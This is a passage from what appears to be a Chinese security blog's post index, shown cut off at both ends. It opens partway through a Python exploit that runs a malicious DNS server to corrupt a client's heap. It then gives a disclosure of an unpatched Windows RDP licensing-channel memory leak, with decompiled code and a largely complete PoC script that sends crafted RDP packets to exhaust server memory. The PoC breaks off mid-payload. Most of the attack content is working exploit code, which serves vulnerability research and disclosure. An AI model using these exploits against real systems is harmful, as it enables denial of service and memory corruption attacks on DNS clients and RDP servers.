2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p0)-0x20) fake_num = (0xffff-0x20-len(p0)-padsize)/(size+0x10) print 'padsize:%x,fake_num:%x'%(padsize, fake_num) return p0+'b'*padsize+fake_header*fake_numdef get_alloc_ow_size_without_records(size, n_answer): n_answer[0] = 2 if size &gt; (0xd1+0x48): raise 'size is too big' n = 0xff &amp; ((0x10000|(size-0x48))-0xff) p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff'+chr(n)+'\\xaa'*18+'\\xc0\\x0d'+'a'*7+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x15'+'a'*0x15+'\\x00' fake_header = '\\xcc'*16+'\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe'+'a'*(size-0x10) padsize = 2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p0)-0x20) fake_num = (0xffff-0x20-len(p0)-padsize)/(size+0x10) print 'padsize:%x,fake_num:%x'%(padsize, fake_num) return p0+'b'*padsize+fake_header*fake_numdef get_alloc_2_A9h_and_ow(n, n_answer): n_answer[0] = 3 p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x21'+'\\x00'*18+'\\xc0\\x0d'+'\\x00'*7+'\\x04'+'\\x11'+'\\x39'+'\\x00'*0x2+'\\x00' p1 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x14'+'\\x00'*18+'\\xc0\\x0e' p2 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff\\x62'+'\\x00'*10+'\\x39'+'\\x00'*7+'\\xc0\\x0f'+'\\x00'*0x30+'\\x39'+'a'*0x39+'\\x15'+'a'*0x15+'\\x00' size = 0xb0 padsize = 2*(size+0x10)-(0x10+0x4c+0xff-size)-(len(p2)-0x20) fake_header = '\\xcc'*16+'\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe'+'\\x00'*(size-0x10) fake_num = (0xffff-0x20-len(p0)-len(p1)-len(p2)-padsize)/(size+0x10) print 'padsize:%x,fake_num:%x'%(padsize, fake_num) return p0+p1+p2+'b'*padsize+fake_header*fake_numdef get_alloc_C0h_many(number, n_answer): if number &gt; 0x7fd: print \"number is too big\" return None # size = (size-0x48-0x3a-0x1c)/2 p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x2d'+'\\x00'*18+'\\xc0\\x0d'+'\\x00'*7+'\\x10'+'\\x28'+'\\x00'*0xf+'\\x00' p1 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x14'+'\\x00'*18+'\\xc0\\x0e' n_answer[0] = number+1 return p0+p1*(number-1)def get_alloc_A9h_many(number, n_answer): if number &gt; 0x7fd: print \"number is too big\" return None # size = (size-0x48-0x3a-0x1c)/2 p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x21'+'\\x00'*18+'\\xc0\\x0d'+'\\x00'*7+'\\x04'+'\\x11'+'\\x39'+'\\x00'*0x2+'\\x00' p1 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x14'+'\\x00'*18+'\\xc0\\x0e' n_answer[0] = number+1 return p0+p1*(number-1)def get_alloc_max(n, n_answer): n_answer[0] = 2 if n &gt; 0x10047 or n &lt; (0x48+0x3b): raise \"number is too large or small\" size = 0xff&amp;(n-0x48-0x3b) size_h = (n-0x48-0x3b)&gt;&gt;8 p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+chr(size_h)+chr(size)+'a'*18+'\\xc0\\x0d' # size = 0xffc4+0x3b = 0xffff return p0def get_alloc_max_and_free(n, n_answer): n_answer[0] = (n+0x100)/8 if n &gt; 0x10047: raise \"number is too large\" size = 0xff&amp;(n-0x48-0x3b) p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff'+chr(size)+'a'*18+'\\xc0\\x0d' # size = 0xffc4+0x3b = 0xffff return p0def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind(('0.0.0.0',53)) server.listen(5) # totalSize = 0 # size = totalSize-0x48-0 n_answer = [0] funcs = [ get_alloc_A9h_many, get_alloc_ow_size, get_alloc_max, get_alloc_2_A9h_and_ow, get_alloc_max_and_free, get_alloc_ow_size_without_records ] steps = [ (3, funcs[0], 0x700), # (1, funcs[0], 0x80), (0x80, funcs[2], 0x10000), (1, funcs[4], 0x10000), (1, funcs[2], 0x10000), (1, funcs[5], 0x100) ] step = 0 step_i = 0 while True: conn,addr = server.accept() print addr while True: print 'step:',step,'step_i', step_i data = conn.recv(1024) if not data: continue # print 'recive:',data.encode('hex') ba = bytearray() # real size is 0xa8+0x48 = 0x100 data = '&#123;:\\x00&lt;65537&#125;'.format(data[:18+getNameLen(data)]+steps[step][1](steps[step][2], n_answer)) ba.extend(map(ord, data)) ba[0] = struct.pack('&gt;H', 0xffff)[0] ba[1] = struct.pack('&gt;H', 0xffff)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = n_answer[0]&gt;&gt;8 ba[9] = n_answer[0]&amp;0xff # other prs ba[10] = 0 ba[11] = 0 ba[12] = 0 ba[13] = 0 data = bytes(ba) if step == 4: thread.start_new_thread(sendAQuery,()) time.sleep(0.001) l = conn.send(data) print 'sent',hex(l), hex(len(data)) print '---------------------------\\n' conn.close() step_i += 1 if steps[step][0] == step_i: step += 1 step_i = 0 break print 'tcp recv exit'def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind(('0.0.0.0', 53)) while True: data, addr = s.recvfrom(2048) print \"received:\", data.encode('hex'), \"from\", addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print \"sent\", hex(l), hex(len(data)) print '-++++++++++++++++++++++\\n' s.close() print 'close udp'import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input('&gt;') 其它以下是溢出的长度计算方式: 注意: 以上所有poc的溢出参数和域名长度以及’9999’密切相关, 如果要修改, 注意更改相应的参数.","categories":[],"tags":[]},{"title":"Windows 远程桌面服务端(RDP server) 内存泄露分享","slug":"rdp_mem_leak_bug","date":"2020-08-26T02:45:44.585Z","updated":"2020-08-26T05:48:20.133Z","comments":true,"path":"2020/08/26/rdp_mem_leak_bug/","link":"","permalink":"http://474172261.github.io/2020/08/26/rdp_mem_leak_bug/","excerpt":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :)","text":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :) RDP协议实现的简介开启远程桌面在windows中, 可以使用下图的选项去实现开启远程桌面 如果不勾选红圈选中的这个选项, 那么在进行登录的用户名和密码交换前, 需要进行一些协议的协商操作; 如果勾选了这个选项, 则会先使用用户名和密码实现一条加密通道, 之后再通过加密通道完成协商. 一个理想的协议实现就应该是后者那样, 连接前用户毕竟都知道用户名和密码了, 那么创建加密通道后再协商应该是最好的, 而不是先协商再认证. 当然, 作为攻击者, 肯定不希望是后者, 那样攻击面变得更小了. 前期的交互如同上图显示的那样, 双方需要经过多次协商, 才能进入后续的认证操作. 在Connection Initial PDU里, 我们需要声明我们要申请的virtual channel, 之后在channel join PDU里请求加入声明的channel. 在完成了图中所有步骤后, 我们就可以发送数据到virtual channel了. 在给virtual channel发送数据前, 并没有完成用户名和密码的认证, 所以, 如果没有勾选红圈的选项, 我们可以在没有用户名/密码的情况下发送数据到virtual channel. Virtual Channelwindows 处理virtual channel 数据的路径为 WDW_OnDataReceived -&gt; WDICART_IcaChannelInputEx -&gt; CRDPWDUMXStack::WDCallback_IcaChannelInput -&gt; CRDPWDUMXStack::OnVirtualChannelData. windows 10 内部有多个virtual channel, 在完成完整认证前, 主要能访问的是如下几个channel: 123456789rdpinptrdpgrfxrdpcmd rdplicrdpdrechoMicrosoft::Windows::RDS::TelemetryMicrosoft::Windows::RDS::BasicInputdrdynvc 此处仅列出部分channel, 下文也只涉及此处列出的channel, 未涉及的可以自己研究一下. 不同的channel有不同的访问方式, 可以通过向channel “drdynvc” 发送channel名称, 来发送数据到名称指定的virtual channel( 支持此方式的channel有 drdynvc, Microsoft::Windows::RDS::BasicInput, Microsoft::Windows::RDS::Telemetry, 还有一些未在上表列出的);另一种方式是通过直接提供channel ID, 发送数据到其它channel. 最终, 他们会调用到CRdpDynVC::OnDataReceived函数来调用给定channel对应的动态处理函数. 当然, 前提是channel已经被open了, 如果没有open, 你可以通过发送type为1的命令到drdynvc去open指定channel. BUG这个bug存在于server 处理 rdplic 通道消息的CUMRDPLicPlugin::HandleClientLicensePdu函数中. 函数大致如下: 12345678910111213int CUMRDPLicPlugin::HandleClientLicensePdu(CUMRDPLicPlugin *this, unsigned int a2, __int64 a3)&#123; v5 = this; if ( a3 &amp;&amp; a2 &gt;= 9 &amp;&amp; (mem_size = *(unsigned int *)(a3 + 4), mem_size &lt;= (unsigned __int64)a2 - 8) )&#123; v9 = operator new[](mem_size); v5-&gt;f_18h.f_8h.memory_60h = (__int64)v9; if ( v9 )&#123; memcpy_0(v9, (const void *)(a3 + 8), *(unsigned int *)(a3 + 4)); ... SetEvent((HANDLE)v5-&gt;f_18h.f_8h.Event_50h); return 0; &#125; &#125;&#125; 表面看起来没什么问题, 问题出在它在set了event后, 并没有触发event的处理函数来处理这片内存, 如果我们再次发送相同的命令, 就会把 v5-&gt;f_18h.f_8h.memory_60h 位置的指针覆盖, 导致原来的内存指针丢失, 从而造成永久的内存泄露(除非重启服务). 漏洞潜在影响当有人启用RDP并关闭安全选项时, 存在被远程恶意耗尽内存的风险, 导致系统缓慢, 服务无法正常执行. 如果开着RDP也开着安全选项, 但是存在弱用户名密码, 也可能被恶意耗尽内存. POCpoc并没有使用CredSSP认证, 需要在测试时在server端关闭红圈中的选项.此处我使用了4个线程去跑, 一个是因为服务端会有一个定时器, 在长时间没有完成认证的情况下, 会主动中断连接, 而我们发送数据时并没有完成认证, 所以需要重新连接. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197#coding:utf-8import socket, sys, structfrom OpenSSL import SSLimport threadingimport timedef send_init_packets(host): data = '\\x03\\x00\\x00\\x13\\x0e\\xe0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x01\\x00\\x00\\x00' s = socket.socket() s.connect((host, 3389)) s.sendall(data) s.recv(8192) ctx = SSL.Context(SSL.TLSv1_METHOD) tls = SSL.Connection(ctx,s) tls.set_connect_state() tls.do_handshake() return tlsdef send_client_data(tls): # add multitransport p2 = '\\x06\\xc0\\x08\\x00\\x00\\x00\\x00\\x00'+'\\x0a\\xc0\\x08\\x00\\x00\\x02\\x00\\x00' # flag SOFTSYNC_TCP_TO_UDP p = \"\\x03\\x00\\x01\\xca\\x02\\xf0\\x80\\x7f\\x65\\x82\\x07\\xc2\\x04\\x01\\x01\\x04\\x01\\x01\\x01\\x01\\xff\\x30\\x19\\x02\\x01\\x22\\x02\\x01\\x02\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x30\\x19\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\x04\\x20\\x02\\x01\\x02\\x30\\x1c\\x02\\x02\\xff\\xff\\x02\\x02\\xfc\\x17\\x02\\x02\\xff\\xff\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x04\\x82\\x01\\x61\\x00\\x05\\x00\\x14\\x7c\\x00\\x01\\x81\\x48\\x00\\x08\\x00\\x10\\x00\\x01\\xc0\\x00\\x44\\x75\\x63\\x61\\x81\\x34\\x01\\xc0\\xea\\x00\\x0a\\x00\\x08\\x00\\x80\\x07\\x38\\x04\\x01\\xca\\x03\\xaa\\x09\\x04\\x00\\x00\\xee\\x42\\x00\\x00\\x44\\x00\\x45\\x00\\x53\\x00\\x4b\\x00\\x54\\x00\\x4f\\x00\\x50\\x00\\x2d\\x00\\x46\\x00\\x38\\x00\\x34\\x00\\x30\\x00\\x47\\x00\\x49\\x00\\x4b\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xca\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x0f\\x00\\xaf\\x07\\x62\\x00\\x63\\x00\\x37\\x00\\x38\\x00\\x65\\x00\\x66\\x00\\x36\\x00\\x33\\x00\\x2d\\x00\\x39\\x00\\x64\\x00\\x33\\x00\\x33\\x00\\x2d\\x00\\x34\\x00\\x31\\x00\\x39\\x38\\x00\\x38\\x00\\x2d\\x00\\x39\\x00\\x32\\x00\\x63\\x00\\x66\\x00\\x2d\\x00\\x00\\x31\\x00\\x62\\x00\\x32\\x00\\x64\\x00\\x61\\x00\\x42\\x42\\x42\\x42\\x07\\x00\\x01\\x00\\x00\\x00\\x56\\x02\\x00\\x00\\x50\\x01\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x04\\xc0\\x0c\\x00\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\xc0\\x0c\\x00\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xc0\\x38\\x00\\x04\\x00\\x00\\x00\\x72\\x64\\x70\\x73\\x6e\\x64\\x00\\x00\\x0f\\x00\\x00\\xc0\\x63\\x6c\\x69\\x70\\x72\\x64\\x72\\x00\\x00\\x00\\xa0\\xc0\\x64\\x72\\x64\\x79\\x6e\\x76\\x63\\x00\\x00\\x00\\x80\\xc0\"+'rdplic\\x00\\x00'+\"\\x00\\x00\\x00\\x00\"+p2 tpkt_size = struct.pack(\"&gt;h\", len(p)) ber_size = struct.pack(\"&gt;h\", len(p)-12) initial_userdata_size = struct.pack(\"&gt;h\", len(p)-109) connectPDU_size = struct.pack(\"&gt;h\", len(p)-118) userdata_value_size = struct.pack(\"&gt;h\", len(p)-132) cs_net_size = struct.pack(\"&gt;h\", len(p)-390 - len(p2)) ba = bytearray() ba.extend(map(ord, p)) ba[2] = tpkt_size[0] ba[3] = tpkt_size[1] ba[10] = ber_size[0] ba[11] = ber_size[1] ba[107] = initial_userdata_size[0] ba[108] = initial_userdata_size[1] ba[116] = 0x81 ba[117] = connectPDU_size[1] ba[130] = 0x81 ba[131] = userdata_value_size[1] ba[392] = cs_net_size[1] tls.sendall(bytes(ba)) tls.recv(8192)def send_client_info(tls): p = b\"\\x03\\x00\\x01\\x61\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x81\\x52\\x40\\x00\\xa1\\xa5\\x09\\x04\\x09\\x04\\xbb\\x47\\x03\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x00\\x00\\x74\\x00\\x65\\x00\\x73\\x00\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x31\\x00\\x39\\x00\\x32\\x00\\x2e\\x00\\x41\\x41\\x41\\x00\\x38\\x00\\x2e\\x00\\x32\\x00\\x33\\x00\\x32\\x00\\x2e\\x00\\x31\\x00\\x00\\x00\\x40\\x00\\x43\\x00\\x3a\\x00\\x5c\\x00\\x57\\x00\\x49\\x00\\x4e\\x00\\x41\\x41\\x41\\x00\\x57\\x00\\x53\\x00\\x5c\\x00\\x73\\x00\\x79\\x00\\x73\\x00\\x74\\x00\\x65\\x00\\x6d\\x00\\x33\\x00\\x32\\x00\\x5c\\x00\\x6d\\x00\\x73\\x00\\x74\\x00\\x73\\x00\\x63\\x00\\x61\\x00\\x78\\x00\\x2e\\x00\\x64\\x00\\x6c\\x00\\x6c\\x00\\x00\\x00\\xa4\\x01\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x53\\x00\\x74\\x00\\x61\\x00\\x6e\\x00\\x64\\x00\\x61\\x00\\x72\\x00\\x64\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x44\\x00\\x61\\x00\\x79\\x00\\x6c\\x00\\x69\\x00\\x67\\x00\\x68\\x00\\x74\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc4\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00\" tls.sendall(p)def send_channel_packets(tls): p1 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x04\\x01\\x00\\x01\\x00\" tls.sendall(p1) p2 = b\"\\x03\\x00\\x00\\x08\\x02\\xf0\\x80\\x28\" tls.sendall(p2) tls.recv(1024) p4 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xeb\" tls.sendall(p4) tls.recv(1024) p5 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xec\" tls.sendall(p5) tls.recv(1024) p6 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xed\" tls.sendall(p6) tls.recv(1024) p7 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xee\" tls.sendall(p7) tls.recv(1024) p8 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xef\" tls.sendall(p8) tls.recv(1024)def send_confirm_active(tls, shareid): p = \"\\x03\\x00\\x02\\x63\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x82\\x54\\x54\\x02\\x13\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\xea\\x03\\x06\\x00\\x3e\\x02\\x4d\\x53\\x54\\x53\\x43\\x00\\x17\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x01\\x00\\x03\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x1d\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x20\\x00\\x01\\x00\\x01\\x00\\x01\\x00\\x80\\x07\\x38\\x04\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x1a\\x01\\x00\\x00\\x00\\x03\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xaa\\x00\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x01\\x01\\x01\\x00\\x01\\x00\\x00\\x00\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\xa1\\x06\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x84\\x03\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x13\\x00\\x28\\x00\\x03\\x00\\x00\\x03\\x78\\x00\\x00\\x00\\x78\\x00\\x00\\x00\\xfc\\x09\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0a\\x00\\x08\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x08\\x00\\x0a\\x00\\x01\\x00\\x14\\x00\\x15\\x00\\x09\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x0d\\x00\\x58\\x00\\x91\\x00\\x20\\x00\\x09\\x04\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x10\\x00\\x34\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x10\\x00\\xfe\\x00\\x20\\x00\\xfe\\x00\\x40\\x00\\xfe\\x00\\x80\\x00\\xfe\\x00\\x00\\x01\\x40\\x00\\x00\\x08\\x00\\x01\\x00\\x01\\x03\\x00\\x00\\x00\\x0f\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x11\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x28\\x64\\x00\\x14\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x0c\\x00\\x02\\x00\\x00\\x00\\x00\\x0a\\x00\\x01\\x1a\\x00\\x08\\x00\\xaf\\x94\\x00\\x00\\x1c\\x00\\x0c\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1b\\x00\\x06\\x00\\x01\\x00\\x1e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x18\\x00\\x0b\\x00\\x02\\x00\\x00\\x00\\x03\\x0c\\x00\\x1d\\x00\\x5f\\x00\\x02\\xb9\\x1b\\x8d\\xca\\x0f\\x00\\x4f\\x15\\x58\\x9f\\xae\\x2d\\x1a\\x87\\xe2\\xd6\\x01\\x03\\x00\\x01\\x01\\x03\\xd4\\xcc\\x44\\x27\\x8a\\x9d\\x74\\x4e\\x80\\x3c\\x0e\\xcb\\xee\\xa1\\x9c\\x54\\x05\\x31\\x00\\x31\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\xc0\\xcb\\x08\\x00\\x00\\x00\\x01\\x00\\xc1\\xcb\\x1d\\x00\\x00\\x00\\x01\\xc0\\xcf\\x02\\x00\\x08\\x00\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x01\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x04\" ba = bytearray() ba.extend(map(ord, p)) tls.sendall(bytes(ba))def send_establish_session(tls): p = b\"\\x03\\x00\\x00\\x24\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x16\\x16\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x08\\x00\\x1f\\x00\\x00\\x00\\x01\\x00\\xea\\x03\" tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" tls.sendall(p) p = b\"\\x03\\x00\\x05\\x81\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x85\\x72\\x72\\x05\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x2b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xa3\\xce\\x20\\x35\\xdb\\x94\\xa5\\xe6\\x0d\\xa3\\x8c\\xfb\\x64\\xb7\\x63\\xca\\xe7\\x9a\\x84\\xc1\\x0d\\x67\\xb7\\x91\\x76\\x71\\x21\\xf9\\x67\\x96\\xc0\\xa2\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\x2b\\xe7\\xb0\\xd2\\xfd\\x81\\x90\\x1a\\x8f\\xd5\\x5e\\xee\\x5a\\x6d\\xcb\\xea\\x2f\\xa5\\x2b\\x06\\xe9\\x0b\\x0b\\xa6\\xad\\x01\\x2f\\x7a\\x0b\\x7c\\xff\\x89\\xd3\\xa3\\xe1\\xf8\\x00\\x96\\xa6\\x8d\\x9a\\x42\\xfc\\xab\\x14\\x05\\x8f\\x16\\xde\\xc8\\x05\\xba\\xa0\\xa8\\xed\\x30\\xd8\\x67\\x82\\xd7\\x9f\\x84\\xc3\\x38\\x27\\xda\\x61\\xe3\\xa8\\xc3\\x65\\xe6\\xec\\x0c\\xf6\\x36\\x24\\xb2\\x0b\\xa6\\x17\\x1f\\x46\\x30\\x16\\xc7\\x73\\x60\\x14\\xb5\\xf1\\x3a\\x3c\\x95\\x7d\\x7d\\x2f\\x74\\x7e\\x56\\xff\\x9c\\xe0\\x01\\x32\\x9d\\xf2\\xd9\\x35\\x5e\\x95\\x78\\x2f\\xd5\\x15\\x6c\\x18\\x34\\x0f\\x43\\xd7\\x2b\\x97\\xa9\\xb4\\x28\\xf4\\x73\\x6c\\x16\\xdb\\x43\\xd7\\xe5\\x58\\x0c\\x5a\\x03\\xe3\\x73\\x58\\xd7\\xd9\\x76\\xc2\\xfe\\x0b\\xd7\\xf4\\x12\\x43\\x1b\\x70\\x6d\\x74\\xc2\\x3d\\xf1\\x26\\x60\\x58\\x80\\x31\\x07\\x0e\\x85\\xa3\\x95\\xf8\\x93\\x76\\x99\\x9f\\xec\\xa0\\xd4\\x95\\x5b\\x05\\xfa\\x4f\\xdf\\x77\\x8a\\x7c\\x29\\x9f\\x0b\\x4f\\xa1\\xcb\\xfa\\x95\\x66\\xba\\x47\\xe3\\xb0\\x44\\xdf\\x83\\x03\\x44\\x24\\xf4\\x1e\\xf2\\xe5\\xcb\\xa9\\x53\\x04\\xc2\\x76\\xcb\\x4d\\xc6\\xc2\\xd4\\x3f\\xd3\\x8c\\xb3\\x7c\\xf3\\xaa\\xf3\\x93\\xfe\\x25\\xbd\\x32\\x7d\\x48\\x6e\\x93\\x96\\x68\\xe5\\x18\\x2b\\xea\\x84\\x25\\x69\\x02\\xa5\\x38\\x65\\x6f\\x0f\\x9f\\xf6\\xa1\\x3a\\x1d\\x22\\x9d\\x3f\\x6d\\xe0\\x4c\\xee\\x8b\\x24\\xf0\\xdc\\xff\\x70\\x52\\xa7\\x0d\\xf9\\x52\\x8a\\x1e\\x33\\x1a\\x30\\x11\\x15\\xd7\\xf8\\x95\\xa9\\xbb\\x74\\x25\\x8c\\xe3\\xe9\\x93\\x07\\x43\\xf5\\x50\\x60\\xf7\